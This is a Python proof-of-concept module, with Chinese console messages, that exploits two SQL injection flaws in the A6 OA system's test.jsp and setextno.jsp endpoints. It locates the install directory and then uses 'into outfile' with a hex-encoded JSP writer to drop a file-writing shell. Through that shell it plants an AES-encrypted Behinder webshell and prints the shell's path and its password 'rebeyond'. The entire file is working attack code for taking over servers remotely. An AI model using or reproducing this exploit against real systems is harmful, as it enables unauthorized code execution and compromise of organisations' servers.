# -*- coding: utf-8 -*-

from poc import core
import re
import random
def test(url,name,path,attack):
	core.start_echo(name)
	r=core.get(url,path)
	if r:
		if r.status_code==200 and '@@basedir' in r.text:
			oa_path=re.findall(r'>(.*?)\\OA\\',r.text)[0]
			oa_path=oa_path+'/OA/tomcat/webapps/yyoa/'
			oa_path=oa_path.replace('\\','/')
			if attack:
				webshell_name="upload_text{}.jsp".format(random.randint(1,999))
				print('\033[32m[#]成功获得根目录：{}\033[0m'.format(oa_path))
				upload(url,oa_path,webshell_name,name)
			else:
				core.end_echo(name,'Payload：'+url+path)
				core.result(name,url+path)
		else:
			core.end_echo(name)
	else:
		core.end_echo(name)

def upload(url,oa_path,webshell_name,name):
	if name=='A6 test.jsp SQL注入漏洞':
		path="/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27{}%27".format(oa_path+webshell_name)
	else:
		path="/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(select unhex('3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E')%20%20into%20outfile%20%27{}%27),4".format(oa_path+webshell_name)
	print('\033[32m[#]开始上传\033[0m')
	r=core.get(url,path)
	if 'already' in r.text and r.status_code==200:
		print('\033[32m[#]上传失败，存在相同文件，请重试\033[0m')
	elif "No Data" in r.text and r.status_code==200:
		get_shell(url,webshell_name,name)
	else:
		print('\033[32m[#]上传失败\033[0m')
		core.end_echo(name)
def get_shell(url,webshell_name,name):
	webshell="test155{}.jsp".format(random.randint(1,999))
	path='/yyoa/{}?f={}'.format(webshell_name,webshell)
	data="t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E"
	header={
		"Content-Type": "application/x-www-form-urlencoded"
	}
	r=core.post(url,path,header,data)
	if r:
		if r.status_code==200:
			webshell_path=url+'/yyoa/'+webshell
			print('\033[32m[#]上传成功\033[0m')
			print('\033[32m[#]webshell路径:{}\033[0m'.format(webshell_path))
			print('\033[32m[#]冰蝎密码：rebeyond\033[0m')
			print('\033[34m----------------------------------------------------\033[0m')
			core.result(name,webshell_path,'rebeyond')
		else:
			print('\033[32m[#]上传失败\033[0m')
			core.end_echo(name)
	else:
		print('\033[32m[#]上传失败\033[0m')
		core.end_echo(name)
			
def run(url,attack):
	name1='A6 test.jsp SQL注入漏洞'
	name2='A6 setextno.jsp SQL注入漏洞'
	path1='/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)'
	path2='/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(SELECT%20@@basedir),4#'
	test(url,name1,path1,attack)
	test(url,name2,path2,attack)